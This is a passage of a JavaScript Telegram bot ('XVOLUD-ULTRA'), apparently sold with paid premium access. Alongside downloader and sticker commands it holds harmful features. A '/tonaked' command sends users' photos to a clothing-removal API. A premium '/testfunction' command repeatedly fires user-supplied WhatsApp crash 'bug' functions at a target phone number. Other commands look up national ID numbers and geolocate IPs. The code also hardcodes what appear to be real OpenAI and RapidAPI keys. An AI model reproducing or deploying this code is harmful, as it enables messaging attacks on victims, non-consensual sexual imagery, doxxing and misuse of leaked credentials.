<blockquote><b><tg-emoji emoji-id="5334890573281114250">✨</tg-emoji> Id Emoji ${i + 1}</b>

<code>${id}</code>

<b>Format Pakai:</b>
<code>&lt;tg-emoji emoji-id="${id}"&gt;✨&lt;/tg-emoji&gt;</code>
</blockquote>
`;
  });

  result += `
<blockquote>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>Total Emoji:</b> ${uniqueEmojis.length}
</blockquote>
`;

  bot.sendMessage(chatId, result, {
    parse_mode: "HTML",
  });
});
// To Naked
bot.onText(/^\/tonaked(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1];
    let imageUrl = args || null;

    if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo.pop().file_id;
      const fileLink = await bot.getFileLink(fileId);
      imageUrl = fileLink;
    }

    if (!imageUrl) {
      return bot.sendMessage(chatId, "❌  Missing Input\nExample: /tonaked (reply gambar)");
    }

    const statusMsg = await bot.sendMessage(chatId, "⏳ Memproses gambar");

    try {
      const res = await fetch(
        `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
      );
      const data = await res.json();
      const hasil = data.result;

      if (!hasil) {
        return bot.editMessageText(
          "❌ ⵢ Gagal memproses gambar, pastikan URL atau foto valid",
          { chat_id: chatId, message_id: statusMsg.message_id }
        );
      }

      await bot.deleteMessage(chatId, statusMsg.message_id);
      await bot.sendPhoto(chatId, hasil);
    } catch (e) {
      await bot.editMessageText("❌ ⵢ Terjadi kesalahan saat memproses gambar", {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
    }
  });

// Test Function
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
bot.onText(/^\/testfunction(?:\s+(.+))?/, async (msg, match) => {
  if (!premiumUsers.some(user => user.id === msg.chat.id && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(msg.chat.id, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOffc" }]
        ]
      }
    });
  }
  
    try {
      const chatId = msg.chat.id;
      const args = msg.text.split(" ");
      if (args.length < 3)
        return bot.sendMessage(chatId, "❌ ⵢ Format :  /testfunction 62××× 10 (reply function)");

      const q = args[1];
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
      if (isNaN(jumlah) || jumlah <= 0)
        return bot.sendMessage(chatId, "❌ ⵢ Jumlah harus angka");

      if (!msg.reply_to_message || !msg.reply_to_message.text)
        return bot.sendMessage(chatId, "❌ ⵢ Reply dengan function");
        
      const processMsg = await bot.sendPhoto(chatId, imageThumbnail, {
        caption: `<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Proccesing`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${q}` }],
          ],
        },
      });

      const safeSock = createSafeSock(sock)
      const funcCode = msg.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return bot.sendMessage("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Succes`;

      try {
        await bot.editMessageCaption(finalText, {
          chat_id: chatId,
          message_id: processMsg.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${q}` }],
            ],
          },
        });
      } catch (e) {
        await bot.sendPhoto(chatId, imageThumbnail, {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${q}` }],
            ],
          },
        });
      }
    } catch (err) {
      console.log(err);
    }
  });

const openaiKey = "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";
const openai = new OpenAI({ apiKey: openaiKey });
bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userExplanation = match[1]?.trim() || "(no explanation provided)";

    // Pastikan reply ke pesan lain
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId,
        "❌ ⵢ Format : Reply Code With Command /fixcode"
      );
    }

    let code = "";
    let filename = "fixed.js";
    let lang = "JavaScript";

    const reply = msg.reply_to_message;

    if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileLink);
      code = response.data;
      filename = reply.document.file_name || "fixed.js";

      if (filename.endsWith(".php")) lang = "PHP";
      else if (filename.endsWith(".py")) lang = "Python";
      else if (filename.endsWith(".html") || filename.endsWith(".htm")) lang = "HTML";
      else if (filename.endsWith(".css")) lang = "CSS";
      else if (filename.endsWith(".json")) lang = "JSON";
      else lang = "JavaScript";

    // === Jika reply text ===
    } else if (reply.text) {
      code = reply.text;
    } else {
      return bot.sendMessage(chatId, "❌ ⵢ Balas ke pesan teks atau file kode.");
    }

    await bot.sendMessage(chatId, "🛠️ ⵢ Process Check & Fix Code");

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dalam kode dan merapikan format. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    });

    const result = completion.choices[0].message.content;

    // === Pisahkan ANALYSIS dan CODE ===
    const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
    const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);
    const explanation = analysisMatch ? analysisMatch[1].trim() : "Tidak ada analisis spesifik.";
    const fixedCode = codeMatch ? codeMatch[1].trim() : result.trim();

    // === Kirim hasil analisis ===
    const header = `
<pre>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${explanation}

<b>XVOLUDULTRA VERSION 20</b>
`;

    await bot.sendMessage(chatId, header, { parse_mode: "HTML" });

    const tempDir = "./temp";
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
    fs.writeFileSync(tempFilePath, fixedCode);

    await bot.sendDocument(chatId, tempFilePath, {}, {
      filename: `Fixed_${filename}`
    });

    fs.unlinkSync(tempFilePath);

    console.log(chalk.green(`✅ ⵢ Code fix completed for user ${senderId}`));

  } catch (error) {
    console.error(chalk.red(`❌ ⵢ Fixcode error: ${error.message}`));
    await bot.sendMessage(msg.chat.id,
      `❌ ⵢ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`
    );
  }
});

bot.onText(/^\/nikparse(?:\s+(.+))?$/i, async (msg, match) => {
  const args = (match[1] || "").split(" ");
  const nik = args[0];

  if (!nik) {
    return bot.sendMessage(msg.chat.id, "❌ ⵢ Format : /nikparse 3510243006730004");
  }

  try {
    const waitMsg = await bot.sendMessage(msg.chat.id, "Process Search NIK...");

    const response = await axios.get(
      `https://nik-parser.p.rapidapi.com/ektp?nik=${nik}`,
      {
        headers: {
          'x-rapidapi-host': 'nik-parser.p.rapidapi.com',
          'x-rapidapi-key': '972f5c568dmsh552ff4877326665p1b6e67jsn290d2652a173'
        },
        timeout: 15000
      }
    );

    const result = response.data;

    try {
      await bot.deleteMessage(msg.chat.id, waitMsg.message_id);
    } catch (e) {}

    if (result.errCode !== 0) {
      return bot.sendMessage(msg.chat.id, `Gagal parsing NIK: ${result.errMessage || 'Unknown error'}`);
    }

    const data = result.data;

    let caption = `<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>\n\n`;
    caption += `│⬡ NIK: ${nik}\n\n`;
    caption += `│╰┈➤ Provinsi: ${data.province || 'Tidak diketahui'}\n`;
    caption += `│⬡ Kota/Kab: ${data.city || 'Tidak diketahui'}\n`;
    caption += `│╰┈➤ Kecamatan: ${data.district || 'Tidak diketahui'}\n`;
    caption += `│⬡ Kode Pos: ${data.zipcode || 'Tidak diketahui'}\n\n`;
    caption += `│╰┈➤ Jenis Kelamin: ${data.gender || 'Tidak diketahui'}\n`;
    caption += `│⬡ Tanggal Lahir: ${data.birthdate || 'Tidak diketahui'}\n`;
    caption += `│╰┈➤ Uniq Code: ${data.uniqcode || 'Tidak diketahui'}`;

    await bot.sendMessage(msg.chat.id, caption, { parse_mode: "HTML" });

  } catch (error) {
    console.error('NIK Parse error:', error.response?.data || error.message);
    
    let errorMessage = 'Gagal parsing NIK\n\n';
    
    if (error.response) {
      if (error.response.status === 400) {
        errorMessage += 'NIK tidak valid';
      } else {
        errorMessage += `Status: ${error.response.status}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      errorMessage += 'Timeout: Request terlalu lama';
    } else {
      errorMessage += `Error: ${error.message}`;
    }
    
    await bot.sendMessage(msg.chat.id, errorMessage);
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(" ").filter(Boolean);
    if (!args[1]) return bot.sendMessage(chatId, "❌ ⵢ Missing Input\nExample: /trackip 8.8.8.8");

    const ip = args[1].trim();

    function isValidIPv4(ip) {
      const parts = ip.split(".");
      if (parts.length !== 4) return false;
      return parts.every((p) => {
        if (!/^\d{1,3}$/.test(p)) return false;
        if (p.length > 1 && p.startsWith("0")) return false;
        const n = Number(p);
        return n >= 0 && n <= 255;
      });
    }

    function isValidIPv6(ip) {
      const ipv6Regex =
        /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
      return ipv6Regex.test(ip);
    }

    if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar"
      );
    }

    const processingMsg = await bot.sendMessage(
      chatId,
      `🔎 ⵢ Tracking IP ${ip} — sedang memproses`
    );
         
    try {
      const res = await axios.get(
        `https://ipwhois.app/json/${encodeURIComponent(ip)}`,
        { timeout: 10000 }
      );
      const data = res.data;

      if (!data || data.success === false) {
        return bot.sendMessage(chatId, `❌ ⵢ Gagal mendapatkan data untuk IP: ${ip}`);
      }

      const lat = data.latitude || "";
      const lon = data.longitude || "";
      const mapsUrl =
        lat && lon
          ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
              lat + "," + lon
            )}` : null;

      const caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡ IP: ${data.ip || "-"}
│╰┈➤ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
│⬡ Region: ${data.region || "-"}
│╰┈➤ City: ${data.city || "-"}
│⬡ ZIP: ${data.postal || "-"}
│╰┈➤ Timezone: ${data.timezone_gmt || "-"}
│⬡ ISP: ${data.isp || "-"}
│╰┈➤ Org: ${data.org || "-"}
│⬡ ASN: ${data.asn || "-"}
│╰┈➤ Lat/Lon: ${lat || "-"}, ${lon || "-"}
╰───────────────⊱
`.trim();

      const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌍 ⵢ Location", url: mapsUrl }]
        ]
      }
    } : null;

      try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await bot.editMessageText(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof imageThumbnail !== "undefined" && imageThumbnail) {
        await bot.sendPhoto(imageThumbnail, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await bot.sendMessage(msg.chat.id, caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await bot.sendMessage(msg.chat.id, caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      console.log(e)
    }

  } catch (err) {
    await bot.sendMessage(msg.chat.id, "❌ ⵢ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti" + err);
  }
});

bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;
    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await bot.sendSticker(chatId, res.data, { filename: "sticker.webp" });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    bot.sendMessage(chatId, "❌ ⵢ Gagal membuat stiker brat.");
  }
});

const iqcSessions = {};
bot.onText(/^\/ssiphone(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const args = msg.text.split(" ").slice(1);
    if (args.length < 3) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ Format : `/ssiphone 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      );
    }

    const time = args[0];
    const battery = args[1];
    const message = args.slice(2).join(" ");

    iqcSessions[chatId] = { time, battery, message };

    await bot.sendMessage(chatId, "Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "Indosat", callback_data: "iqc_provider_Indosat" },
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Failed /iqc:", err.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses IQC.");
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  try {
    if (!query.data.startsWith("iqc_provider_")) return;

    const provider = query.data.replace("iqc_provider_", "");
    const data = iqcSessions[chatId];

    if (!data) {
      return bot.sendMessage(chatId, "Data IQC tidak ditemukan. Jalankan command /iqc lagi.");
    }

    const { time, battery, message } = data;
    await bot.answerCallbackQuery(query.id, { text: "Diproses..." });
    await bot.sendMessage(chatId, "Sedang membuat gambar...");

    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
      time
    )}&b=${encodeURIComponent(battery)}&m=${encodeURIComponent(
      message
    )}&p=${encodeURIComponent(provider)}`;

    await bot.sendPhoto(chatId, apiUrl, {
      caption: "✅ ⵢ SsIphone By XcovzOfficial ( 🕷️ )",
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("ERROR callback_query:", err.message);
    bot.sendMessage(chatId, "Gagal generate IQC.");
  }
});

bot.onText(/^\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOffc" }]
        ]
      }
    });
  }
  await bot.sendMessage(chatId, "Succes Restart Bot");
  setTimeout(() => process.exit(0), 1000);
});

bot.onText(/^\/tiktokdl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1]?.trim();

  if (!args)
    return bot.sendMessage(
      chatId,
      "❌ ⵢ Format: /tiktokdl https://example.com/"
    );

  let url = args;

  if (msg.entities) {
    for (const e of msg.entities) {
      if (e.type === "url") {
        url = msg.text.substring(e.offset, e.offset + e.length);
        break;
      }
    }
  }

  const wait = await bot.sendMessage(chatId, "Process Download Media Tiktok");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return bot.sendMessage(chatId, "❌ ⵢ Gagal ambil data video, pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = [];

      for (const img of imgs) {
        const res = await axios.get(img, { responseType: "arraybuffer" });
        media.push({
          type: "photo",
          media: { source: Buffer.from(res.data) }
        });
      }

      await bot.sendMediaGroup(chatId, media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await bot.sendVideo(
      chatId,
      Buffer.from(video.data),
      { supports_streaming: true },
      { filename: `${d.id || Date.now()}.mp4` }
    );
  } catch (e) {
    const errMsg = e?.response?.status
      ? `❌ ⵢ Error ${e.response.status} saat mengunduh video`
      : "❌ ⵢ Gagal mengunduh, koneksi lambat atau link salah";
    await bot.sendMessage(chatId, errMsg);
  } finally {
    try {
      await bot.deleteMessage(chatId, wait.message_id);
    } catch {}
  }
});

const sesi = {}

async function getTrack(query) {
  const url = `https://api.nekolabs.web.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`
  const res = await axios.get(url)
  return res.data.result
}

bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const query = match[1]

  if (!query) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /play judul lagu")
  }

  sesi[chatId] = {
    musicList: [],
    index: 0
  }

  try {
    const result = await getTrack(query)
    sesi[chatId].musicList.push(result)
    sendMusicCard(chatId)
  } catch {
    bot.sendMessage(chatId, "❌ ⵢ Lagu tidak ditemukan.")
  }
})

bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id
  const action = cb.data

  const session = sesi[chatId]
  if (!session || session.musicList.length === 0) {
  return bot.answerCallbackQuery(cb.id, { text: "‎ " })
  }

  const d = session.musicList[session.index]

  if (action === "music_play") {
    await bot.answerCallbackQuery(cb.id)
    return bot.sendAudio(chatId, d.downloadUrl, {
      title: d.metadata.title,
      performer: d.metadata.artist
    })
  }

  if (action === "music_lyrics") {
    await bot.answerCallbackQuery(cb.id)
    try {
      const lyr = await axios.get(
        `https://api.deline.web.id/tools/lyrics?title=${encodeURIComponent(d.metadata.title)}`
      )
      return bot.sendMessage(
        chatId,
        lyr.data.result?.[0]?.plainLyrics || "❌ ⵢ Lirik tidak ditemukan."
      )
    } catch {
      return bot.sendMessage(chatId, "❌ ⵢ Error mengambil lirik.")
    }
  }
})

function sendMusicCard(chatId) {
  const session = sesi[chatId]
  const d = session.musicList[session.index]
  const meta = d.metadata

  const caption = `🎵 Song Name *${meta.title}*
👤 Artist : ${meta.artist}
⏱ Duration : ${meta.duration}
`

  bot.sendPhoto(chatId, meta.cover, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎧 Play", callback_data: "music_play" }],
        [{ text: "🔤 Lyrics", callback_data: "music_lyrics" }]
      ]
    }
  })
}

bot.onText(/^\/instagramdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const q = match[1]

  if (!q) return bot.sendMessage(chatId, "❌ ⵢ Format: /instagramdl <url>")

  bot.sendMessage(chatId, "🕑 ⵢ Process Download media...")

  const api = `https://api.nekolabs.web.id/downloader/instagram?url=${encodeURIComponent(q)}`

  try {
    const r = await axios.get(api, { timeout: 15000 })
    if (!r.data || !r.data.success) return bot.sendMessage(chatId, "❌ ⵢ Gagal mengambil data")

    const list = r.data.result.downloadUrl

    if (!Array.isArray(list) || list.length === 0) return bot.sendMessage(chatId, "❌ ⵢ Media tidak ditemukan")

    for (const media of list) {
      if (media.endsWith(".mp4")) {
        await bot.sendVideo(chatId, media)
      } else {
        await bot.sendPhoto(chatId, media)
      }
    }

  } catch (e) {
    console.log("Err IG:", e.message)
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan, coba lagi")
  }
})

bot.onText(/^\/facebookdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const text = match[1]

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Format: /facebookdl <url>")

  const wait = await bot.sendMessage(chatId, "🕑 ⵢ Process Download Media...")

  try {
    const api = `https://api.nekolabs.web.id/downloader/facebook?url=${encodeURIComponent(text)}`
    const res = await axios.get(api)
    const result = res.data.result

    if (!result || !result.medias || result.medias.length === 0) {
      await bot.deleteMessage(chatId, wait.message_id)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada media ditemukan.")
    }

    for (const m of result.medias) {
      if (m.type === "image") {
        await bot.sendPhoto(chatId, m.url)
      } else if (m.type === "video") {
        await bot.sendVideo(chatId, m.url)
      }
    }

    await bot.deleteMessage(chatId, wait.message_id)
  } catch (e) {
    try { await bot.deleteMessage(chatId, wait.message_id) } catch {}
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan.")
  }
})

bot.onText(/^\/gconly(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  const args = (match[1] || "").trim();
  if (!args || !/(on|off)/i.test(args)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /gconly on | off");
  }
  const mode = args.toLowerCase();
  const status = mode === "on";
  setGroupOnly(status);
  bot.sendMessage(chatId, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/cekid$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const firstName = user.first_name || "";
  const lastName = user.last_name || "";
  const userId = user.id;
  try {
    const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    const fileId = photos.photos[0][0].file_id;
    const text = `<b>User Info :</b>\n<b>USERNAME :</b> ${user.username ? '@' + user.username : 'Tidak ada'}\n<b>ID TELEGRAM:</b> <code>${userId}</code>`;
    bot.sendPhoto(chatId, fileId, {
      caption: text,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: `${firstName} ${lastName}`, url: `tg://user?id=${userId}` }]
        ]
      }
    });
  } catch (e) {
    bot.sendMessage(chatId, `<b>ID :</b> <code>${userId}</code>`, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  }
});

bot.onText(/^\/pinterest(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match && match[1]) ? match[1].trim() : "";
  if (!query) return bot.sendMessage(chatId, "❌ ⵢ Format : /pinterest Butterfly");
  try {
    const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;
    const res = await axios.get(apiUrl, { timeout: 15000 });
    const data = res.data;
    if (!data || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ No Pinterest images found for your query.");
    }
    await bot.sendVideo(chatId, data.result[0], { caption: `📌 Pinterest Result for: *${query}*`, parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Error fetching Pinterest image. Please try again later.");
  }
});


bot.onText(/^\/tofigure$/i, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  if (!reply || !reply.photo) return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Image With Caption /tofigure.");
  await bot.sendMessage(chatId, "🕑 ⵢ Process Tofigure");
  try {
    const photo = reply.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await bot.getFile(fileId);
    const telegramUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
    const apiUrl = `https://api.elrayyxml.web.id/api/ephoto/figure?url=${encodeURIComponent(telegramUrl)}`;
    const result = await axios.get(apiUrl, { responseType: "arraybuffer", timeout: 30000 });
    await bot.sendVideo(chatId, Buffer.from(result.data), { caption: "✅ ⵢ Tofigure By XcovzOfficial ( 🍁 )" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan." + (e.message || ""));
  }
});

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ ⵢ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ ⵢ Tourl By XcovzOfficial ( 🕷️ )\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ ⵢ Gagal mengupload file ke Catbox");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const userId = msg.from.id;
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
